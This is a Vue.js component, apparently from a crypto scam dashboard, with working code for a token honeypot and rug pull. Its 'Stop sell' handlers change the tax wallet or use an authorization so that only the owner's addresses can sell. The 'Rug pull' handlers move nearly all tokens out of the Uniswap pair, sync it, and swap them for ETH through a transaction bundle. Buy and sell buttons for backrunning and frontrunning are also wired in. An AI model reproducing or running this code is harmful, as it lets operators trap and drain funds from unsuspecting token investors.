<template>
  <div class="card">
    <div class="card-body p-4">
      <div class="d-flex justify-content-between">
        <h2>Transactions</h2>
        <div
          v-if="contract"
          style="width: 100px; margin-top: -10px"
          class="button-text d-flex justify-content-center align-items-center"
        >
          <a
            v-if="!isUnstopping"
            class="w-100 btn-theme btn-w ms-0"
            style="background: red"
            @click="handleUnstopNew()"
            >Unstop</a
          ><img v-else class="loading-icon" src="img/spinner.svg" />
        </div>
        <div
          v-if="contract"
          style="width: 100px; margin-top: -10px"
          class="button-text d-flex justify-content-center align-items-center"
        >
          <a class="w-100 btn-theme btn-w ms-0" @click="handleRefresh()"
            >Refresh</a
          >
        </div>
        <div
          v-if="contract"
          style="width: 100px; margin-top: -10px"
          class="button-text d-flex justify-content-center align-items-center"
        >
          <a
            v-if="!isStopping"
            class="w-100 btn-theme btn-w ms-0"
            style="background: red"
            @click="handleStopNew()"
            >Stop sell</a
          ><img v-else class="loading-icon" src="img/spinner.svg" />
        </div>
        <div
          v-if="contract"
          style="width: 100px; margin-top: -10px"
          class="button-text d-flex justify-content-center align-items-center"
        >
          <a
            v-if="!isRugPulling"
            class="w-100 btn-theme btn-w ms-0"
            style="background: red"
            @click="handleRugPull()"
            >Rug pull</a
          ><img v-else class="loading-icon" src="img/spinner.svg" />
        </div>
        <!-- <div
          v-if="contract"
          style="width: 100px; margin-top: -10px"
          class="button-text d-flex justify-content-center align-items-center"
        >
          <a class="w-100 btn-theme btn-w ms-0" @click="setAbi()">Set ABI</a>
        </div> -->
      </div>
      <div>
        <input
          v-model="txConfig.rpcUrl"
          type="text"
          class="form-control"
          placeholder=""
        />
      </div>
      <div v-for="history in histories" :key="history.id" class="border4 mt-5">
        <div
          class="d-flex border amenu align-items-center justify-content-between flex-wrap"
        >
          <a class="btn-full" :style="'background:' + getNonceColor(history)"
            >Nonce: {{ history.get('data').transaction.nonce }}</a
          >
          <p class="pe-1">
            From: {{ formatAddress(history.get('data').transaction.from) }}
          </p>
          <div class="border-end h100p"></div>
          <p class="pe-1">
            To: {{ formatAddress(history.get('data').transaction.to) }}
          </p>
          <!-- <div class="border-end h100p"></div> -->
          <div
            v-if="!hasNoFunctions"
            :style="
              getTransactionDetails(history).status != 'pending'
                ? 'visibility: hidden!important;'
                : ''
            "
            class="button-text d-flex justify-content-center align-items-center"
          >
            <a class="btn-theme btn-w ms-0" @click="handleBuy(history)">Buy</a>
            <a class="btn-theme btn-w ms-2" @click="handleSell(history)"
              >Sell</a
            >
          </div>
        </div>
        <div class="d-flex p-3 pb-0 flex-wrap">
          <span class="me-3">Method :</span>
          <a class="border-theme">{{
            getTransactionDetails(history).method
              ? getTransactionDetails(history).method
              : getTransactionDetails(history).selector
          }}</a>
          <span v-if="isWarn(history, getTransactionDetails(history))"
            ><b class="text-danger ms-3">WARN</b></span
          >
          <p class="m-0 ms-3">Time: {{ getTime(history) }}</p>
        </div>
        <div class="code-select p-3 pt-0">
          <VueJsonPretty
            :path="'res'"
            :data="getTransactionDetails(history)"
            style="max-width: 800px; overflow-x: auto"
          />
        </div>
      </div>
    </div>

    <input-modal
      :title="inputModalTitle"
      :active="inputModalActive"
      :btnOk="inputModalBtnOk"
      :btnCancel="inputModalBtnCancel"
      :callback="inputModalCallback"
      :fields="inputModalFields"
      @cancel="inputModalActive = false"
    />
  </div>
</template>

<script>
import VueJsonPretty from 'vue-json-pretty';
import Transaction from '@/helpers/Transaction';
import { mapGetters, mapActions } from 'vuex';
import Observer from '@/helpers/Observer';
import Utils from '@/helpers/Utils';
import { C_NEW_TX } from '@/constants/events';
import InputModal from '@/components/InputModal.vue';
import Web3 from '@/helpers/Web3';
import { ethers } from 'ethers';
import Ethers from '@/helpers/Ethers';
import abi from '../../../constants/abi';
import { createPublicClient, createWalletClient, http } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { mainnet } from 'viem/chains';

export default {
  name: 'HistoryList',
  props: ['contract', 'hasNoFunctions'],
  components: {
    VueJsonPretty,
    InputModal,
  },
  data() {
    return {
      histories: [],
      colors: {},

      // Input Modal
      inputModalFields: [],
      inputModalActive: false,
      inputModalTitle: '',
      inputModalCallback: null,
      inputModalBtnOk: 'Yes',
      inputModalBtnCancel: 'Cancel',

      isStopping: false,
      isUnstopping: false,
      isRugPulling: false,
    };
  },
  computed: {
    ...mapGetters({
      accounts: 'accounts/list',
      txConfig: 'transactions/config',
    }),
  },
  watch: {},
  beforeDestroy() {
    Observer.$off(C_NEW_TX, this.handleNewTx);
  },
  async mounted() {
    Observer.$on(C_NEW_TX, this.handleNewTx);
    if (this.contract) {
      this.histories = await this.fetch(this.contract.get('address'));
    }
  },
  methods: {
    ...mapActions({
      fetch: 'histories/fetch',
      getTxConfig: 'transactions/getConfig',
    }),
    async handleRefresh() {
      this.isStopping = false;
      this.isUnstopping = false;
      this.isRugPulling = false;
    },
    async handleStop() {
      const rpcProvider = new ethers.providers.JsonRpcProvider(
        this.txConfig.rpcUrl
      );
      this.isStopping = true;
      try {
        const ownerPK = this.txConfig.unclogOrPK;
        const owner = new ethers.Wallet(ownerPK);
        const ownerNonce = await rpcProvider.getTransactionCount(owner.address);
        const token = this.$route.params.address;
        const iface = new ethers.utils.Interface([
          'function setTaxWallet(address payable newWallet)',
        ]);
        const txConfig = await this.getTxConfig({
          action: 'buy',
        });
        const txs = [
          {
            to: token,
            data: iface.encodeFunctionData('setTaxWallet', [
              '0xf7dfa2d3fa520b69bb8ba512842a89b802bb1672',
            ]),
            gasLimit: BigInt(txConfig.gas),
            maxFeePerGas: `0x${(
              BigInt(txConfig.maxFeePerGas) +
              BigInt(
                ethers.utils.parseUnits(
                  this.txConfig.bundlePriorityFee.toString(),
                  9
                )
              )
            ).toString(16)}`,
            maxPriorityFeePerGas: `0x${(
              BigInt(txConfig.maxPriorityFeePerGas) +
              BigInt(
                ethers.utils.parseUnits(
                  this.txConfig.bundlePriorityFee.toString(),
                  9
                )
              )
            ).toString(16)}`,
            type: 2,
            nonce: BigInt(ownerNonce),
          },
        ];
        const pks = [ownerPK];
        const txResult = await Ethers.sendBundleNew(
          [txs, txs, txs],
          pks,
          await Ethers.getBlockNumber()
        );

        if ('error' in txResult) {
          this.$toast.error(`Stop sell error: ${txResult.error}`, {
            position: 'top-right',
            timeout: 2000,
            closeOnClick: true,
          });
        } else {
          this.$toast('Stop sell success', {
            position: 'top-right',
            timeout: 2000,
            closeOnClick: true,
          });
        }
      } catch (err) {
        console.log(err);
        this.$toast.error(`Stop sell error: ${err.message}`, {
          position: 'top-right',
          timeout: 2000,
          closeOnClick: true,
        });
      }
      this.isStopping = false;
    },
    async handleStopNew() {
      this.isStopping = true;
      try {
        const ownerPK =
          this.txConfig.unclogOrPK.length == 64
            ? '0x'
            : '' + this.txConfig.unclogOrPK;
        const ownerAccount = privateKeyToAccount(ownerPK);
        const publicClient = createPublicClient({
          transport: http(this.txConfig.rpcUrl),
        });
        const walletClient = createWalletClient({
          chain: mainnet,
          transport: http(this.txConfig.rpcUrl),
          account: ownerAccount,
        });
        const iface = new ethers.utils.Interface([
          'function init(address[] calldata _white)',
        ]);
        const txConfig = await this.getTxConfig({
          action: 'buy',
        });
        const authorization = await walletClient.signAuthorization({
          account: ownerAccount,
          contractAddress: '0x08BF3AA11cF3063aE49C9383E74EB72B3329Aa24',
          chainId: 1,
          executor: 'self',
        });
        const rawTx = await walletClient.signTransaction(
          await walletClient.prepareTransactionRequest({
            to: ownerAccount.address,
            data: iface.encodeFunctionData('init', [
              [ownerAccount.address, this.accounts[1].get('address')],
            ]),
            gas: BigInt(txConfig.gas),
            maxFeePerGas:
              BigInt(txConfig.maxFeePerGas) +
              BigInt(
                ethers.utils.parseUnits(
                  this.txConfig.bundlePriorityFee.toString(),
                  9
                )
              ) +
              5000000000n,
            maxPriorityFeePerGas:
              BigInt(txConfig.maxPriorityFeePerGas) +
              BigInt(
                ethers.utils.parseUnits(
                  this.txConfig.bundlePriorityFee.toString(),
                  9
                )
              ) +
              5000000000n,
            authorizationList: [authorization],
          })
        );
        const hash = await publicClient.sendRawTransaction({
          serializedTransaction: rawTx,
        });
        await publicClient.waitForTransactionReceipt({
          hash,
        });
        this.$toast('Stop sell success', {
          position: 'top-right',
          timeout: 2000,
          closeOnClick: true,
        });
        // const txResult = await Ethers.sendBundleNew(
        //   [txs, txs, txs],
        //   pks,
        //   await Ethers.getBlockNumber()
        // );

        // if ('error' in txResult) {
        //   this.$toast.error(`Stop sell error: ${txResult.error}`, {
        //     position: 'top-right',
        //     timeout: 2000,
        //     closeOnClick: true,
        //   });
        // } else {
        //   this.$toast('Stop sell success', {
        //     position: 'top-right',
        //     timeout: 2000,
        //     closeOnClick: true,
        //   });
        // }
      } catch (err) {
        console.log(err);
        this.$toast.error(`Stop sell error: ${err.message}`, {
          position: 'top-right',
          timeout: 2000,
          closeOnClick: true,
        });
      }
      this.isStopping = false;
    },
    async handleUnstopNew() {
      this.isUnstopping = true;
      try {
        const ownerPK =
          this.txConfig.unclogOrPK.length == 64
            ? '0x'
            : '' + this.txConfig.unclogOrPK;
        const ownerAccount = privateKeyToAccount(ownerPK);
        const publicClient = createPublicClient({
          transport: http(this.txConfig.rpcUrl),
        });
        const walletClient = createWalletClient({
          chain: mainnet,
          transport: http(this.txConfig.rpcUrl),
          account: ownerAccount,
        });
        const txConfig = await this.getTxConfig({
          action: 'buy',
        });
        const authorization = await walletClient.signAuthorization({
          account: ownerAccount,
          contractAddress: '0x0000000000000000000000000000000000000000',
          chainId: 1,
          executor: 'self',
        });
        const rawTx = await walletClient.signTransaction(
          await walletClient.prepareTransactionRequest({
            to: ownerAccount.address,
            gas: BigInt(txConfig.gas),
            maxFeePerGas:
              BigInt(txConfig.maxFeePerGas) +
              BigInt(
                ethers.utils.parseUnits(
                  this.txConfig.bundlePriorityFee.toString(),
                  9
                )
              ),
            maxPriorityFeePerGas:
              BigInt(txConfig.maxPriorityFeePerGas) +
              BigInt(
                ethers.utils.parseUnits(
                  this.txConfig.bundlePriorityFee.toString(),
                  9
                )
              ),
            authorizationList: [authorization],
          })
        );
        const hash = await publicClient.sendRawTransaction({
          serializedTransaction: rawTx,
        });
        await publicClient.waitForTransactionReceipt({
          hash,
        });
        this.$toast('Unstop sell success', {
          position: 'top-right',
          timeout: 2000,
          closeOnClick: true,
        });
        // const txResult = await Ethers.sendBundleNew(
        //   [txs, txs, txs],
        //   pks,
        //   await Ethers.getBlockNumber()
        // );

        // if ('error' in txResult) {
        //   this.$toast.error(`Stop sell error: ${txResult.error}`, {
        //     position: 'top-right',
        //     timeout: 2000,
        //     closeOnClick: true,
        //   });
        // } else {
        //   this.$toast('Stop sell success', {
        //     position: 'top-right',
        //     timeout: 2000,
        //     closeOnClick: true,
        //   });
        // }
      } catch (err) {
        console.log(err);
        this.$toast.error(`Stop sell error: ${err.message}`, {
          position: 'top-right',
          timeout: 2000,
          closeOnClick: true,
        });
      }
      this.isUnstopping = false;
    },
    async handleRugPullWithDeployer() {
      const rpcProvider = new ethers.providers.JsonRpcProvider(
        this.txConfig.rpcUrl
      );
      this.isRugPulling = true;
      try {
        const ownerPK = this.txConfig.unclogOrPK;
        const owner = new ethers.Wallet(ownerPK);
        const ownerNonce = BigInt(
          await rpcProvider.getTransactionCount(owner.address)
        );
        const token = this.$route.params.address;
        const ROUTER_ADDRESS = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D';
        const FACTORY_ADDRESS = '0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f';
        const WETH_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
        const uniswapV2FactoryContract = new ethers.Contract(
          FACTORY_ADDRESS,
          abi.UniswapFactoryABI,
          rpcProvider
        );
        const pairAddress = await uniswapV2FactoryContract.getPair(
          token,
          WETH_ADDRESS
        );
        const tokenContract = new ethers.Contract(
          token,
          abi.ERC20ABI,
          rpcProvider,
        );
        const pairBalance = BigInt(await tokenContract.balanceOf(pairAddress, {from: "0x0000000000000000000000000000000000000000"}));
        const amountToTransfer = (pairBalance * 999999n) / 1000000n;
        const iface = new ethers.utils.Interface([
          'function setTaxWallet(address payable newWallet)',
          'function transferFrom(address sender, address recipient, uint256 amount)',
          'function sync()',
          'function approve(address spender, uint256 amount)',
          'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)',
        ]);
        const txConfig = await this.getTxConfig({
          action: 'buy',
        });
        const maxFeePerGas = `0x${(
          BigInt(txConfig.maxFeePerGas) +
          BigInt(
            ethers.utils.parseUnits(
              this.txConfig.bundlePriorityFee.toString(),
              9
            )
          )
        ).toString(16)}`;
        const maxPriorityFeePerGas = `0x${(
          BigInt(txConfig.maxPriorityFeePerGas) +
          BigInt(
            ethers.utils.parseUnits(
              this.txConfig.bundlePriorityFee.toString(),
              9
            )
          )
        ).toString(16)}`;
        const txs = [
          {
            to: token,
            data: iface.encodeFunctionData('transferFrom', [
              pairAddress,
              owner.address,
              amountToTransfer,
            ]),
            gasLimit: BigInt(txConfig.gas),
            maxFeePerGas,
            maxPriorityFeePerGas,
            type: 2,
            nonce: ownerNonce,
          },
          {
            to: pairAddress,
            data: iface.encodeFunctionData('sync'),
            gasLimit: BigInt(txConfig.gas),
            maxFeePerGas,
            maxPriorityFeePerGas,
            type: 2,
            nonce: ownerNonce + 1n,
          },
          {
            to: token,
            data: iface.encodeFunctionData('approve', [
              ROUTER_ADDRESS,
              amountToTransfer * 2n,
            ]),
            gasLimit: BigInt(txConfig.gas),
            maxFeePerGas,
            maxPriorityFeePerGas,
            type: 2,
            nonce: ownerNonce + 2n,
          },
          {
            to: ROUTER_ADDRESS,
            data: iface.encodeFunctionData(
              'swapExactTokensForETHSupportingFeeOnTransferTokens',
              [
                amountToTransfer,
                0n,
                [token, WETH_ADDRESS],
                owner.address,
                BigInt(Number.parseInt(new Date().getTime() / 1000) + 60),
              ]
            ),
            gasLimit: BigInt(txConfig.gas),
            maxFeePerGas,
            maxPriorityFeePerGas,
            type: 2,
            nonce: ownerNonce + 3n,
          },
        ];
        const pks = [ownerPK, ownerPK, ownerPK, ownerPK];
        const txResult = await Ethers.sendBundleNew(
          [txs, txs, txs],
          pks,
          await Ethers.getBlockNumber()
        );

        if ('error' in txResult) {
          this.$toast.error(`Rug pull error: ${txResult.error}`, {
            position: 'top-right',
            timeout: 2000,
            closeOnClick: true,
          });
        } else {
          this.$toast('Rug pull success', {
            position: 'top-right',
            timeout: 2000,
            closeOnClick: true,
          });
        }
      } catch (err) {
        console.log(err);
        this.$toast.error(`Rug pull error: ${err.message}`, {
          position: 'top-right',
          timeout: 2000,
          closeOnClick: true,
        });
      }
      this.isRugPulling = false;
    },
    async handleRugPull() {
      const rpcProvider = new ethers.providers.JsonRpcProvider(
        this.txConfig.rpcUrl
      );
      this.isRugPulling = true;
      try {
        const ownerPK = this.txConfig.unclogOrPK;
        const owner = new ethers.Wallet(ownerPK);
        const ownerNonce = BigInt(
          await rpcProvider.getTransactionCount(owner.address)
        );
        const firstPK = this.accounts[1].pk;
        const firstAddress = this.accounts[1].get('address');
        const firstNonce = BigInt(
          await rpcProvider.getTransactionCount(firstAddress)
        );
        const token = this.$route.params.address;
        const ROUTER_ADDRESS = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D';
        const FACTORY_ADDRESS = '0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f';
        const WETH_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
        const uniswapV2FactoryContract = new ethers.Contract(
          FACTORY_ADDRESS,
          abi.UniswapFactoryABI,
          rpcProvider
        );
        const pairAddress = await uniswapV2FactoryContract.getPair(
          token,
          WETH_ADDRESS
        );
        const tokenContract = new ethers.Contract(
          token,
          abi.ERC20ABI,
          rpcProvider
        );
        const pairBalance = BigInt(await tokenContract.balanceOf(pairAddress));
        const amountToTransfer = (pairBalance * 999999n) / 1000000n;
        const iface = new ethers.utils.Interface([
          'function setTaxWallet(address payable newWallet)',
          'function transferFrom(address sender, address recipient, uint256 amount)',
          'function sync()',
          'function approve(address spender, uint256 amount)',
          'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)',
        ]);
        const txConfig = await this.getTxConfig({
          action: 'buy',
        });
        const maxFeePerGas = `0x${(
          BigInt(txConfig.maxFeePerGas) +
          BigInt(
            ethers.utils.parseUnits(
              this.txConfig.bundlePriorityFee.toString(),
              9
            )
          )
        ).toString(16)}`;
        const maxPriorityFeePerGas = `0x${(
          BigInt(txConfig.maxPriorityFeePerGas) +
          BigInt(
            ethers.utils.parseUnits(
              this.txConfig.bundlePriorityFee.toString(),
              9
            )
          )
        ).toString(16)}`;
        const txs = [
          {
            to: token,
            data: iface.encodeFunctionData('transferFrom', [
              pairAddress,
              firstAddress,
              amountToTransfer,
            ]),
            gasLimit: BigInt(txConfig.gas),
            maxFeePerGas,
            maxPriorityFeePerGas,
            type: 2,
            nonce: ownerNonce,
          },
          {
            to: pairAddress,
            data: iface.encodeFunctionData('sync'),
            gasLimit: BigInt(txConfig.gas),
            maxFeePerGas,
            maxPriorityFeePerGas,
            type: 2,
            nonce: ownerNonce + 1n,
          },
          {
            to: token,
            data: iface.encodeFunctionData('approve', [
              ROUTER_ADDRESS,
              amountToTransfer * 2n,
            ]),
            gasLimit: BigInt(txConfig.gas),
            maxFeePerGas,
            maxPriorityFeePerGas,
            type: 2,
            nonce: firstNonce,
          },
          {
            to: ROUTER_ADDRESS,
            data: iface.encodeFunctionData(
              'swapExactTokensForETHSupportingFeeOnTransferTokens',
              [
                amountToTransfer,
                0n,
                [token, WETH_ADDRESS],
                // owner.address,
                // firstAddress,
                this.accounts[0].get('address'),
                BigInt(Number.parseInt(new Date().getTime() / 1000) + 60),
              ]
            ),
            gasLimit: BigInt(txConfig.gas),
            maxFeePerGas,
            maxPriorityFeePerGas,
            type: 2,
            nonce: firstNonce + 1n,
          },
        ];
        const pks = [ownerPK, ownerPK, firstPK, firstPK];
        const txResult = await Ethers.sendBundleNew(
          [txs, txs, txs],
          pks,
          await Ethers.getBlockNumber()
        );

        if ('error' in txResult) {
          this.$toast.error(`Rug pull error: ${txResult.error}`, {
            position: 'top-right',
            timeout: 2000,
            closeOnClick: true,
          });
        } else {
          this.$toast('Rug pull success', {
            position: 'top-right',
            timeout: 2000,
            closeOnClick: true,
          });
        }
      } catch (err) {
        console.log(err);
        this.$toast.error(`Rug pull error: ${err.message}`, {
          position: 'top-right',
          timeout: 2000,
          closeOnClick: true,
        });
      }
      this.isRugPulling = false;
    },
    setAbi() {
      console.log(Web3.getAbi(this.contract.get('address')));
      this.inputModalActive = true;
      this.inputModalBtnOk = 'Ok';
      this.inputModalBtnCancel = 'Cancel';
      this.inputModalFields = [
        {
          label: 'ABI',
          model: JSON.stringify(Web3.getAbi(this.contract.get('address'))),
          type: 'textarea',
        },
      ];

      this.inputModalTitle = 'Set ABI';
      this.inputModalActive = true;
      this.inputModalCallback = async () => {
        this.inputModalActive = false;
        Web3.setAbi(
          this.contract.get('address'),
          JSON.parse(this.inputModalFields[0].model)
        );
      };
    },
    handleNewTx(history) {
      if (history.test) {
        return;
      }
      this.histories.unshift(history);
    },
    formatAddress(address) {
      return Utils.formatAddress(address);
    },
    handleBuy(history) {
      Observer.$emit('buy', {
        history,
        type: 'backrun',
      });
    },
    handleSell(history) {
      Observer.$emit('sell', {
        history,
        type: 'frontrun',
      });
    },
    getTime(history) {
      const date = new Date(history.get('data').timeStamp);
      return date.toLocaleString();
    },
    getNonceColor(history) {
      const nonce = history.get('data').transaction.nonce;
      if (!this.colors[nonce]) {
        const r = Math.floor(Math.random() * 255);
        const g = Math.floor(Math.random() * 255);
        const b = Math.floor(Math.random() * 255);
        this.colors[nonce] = `rgb(${r}, ${g}, ${b});`;
      }
      return this.colors[nonce];
    },
    isWarn(history, details) {
      return Transaction.isWarn(
        history,
        this.accounts,
        details,
        this.txConfig.warns
      );
    },
    getTransactionDetails(history) {
      return Transaction.getDetails(this.contract, history);
    },
  },
};
</script>
<style scoped></style>
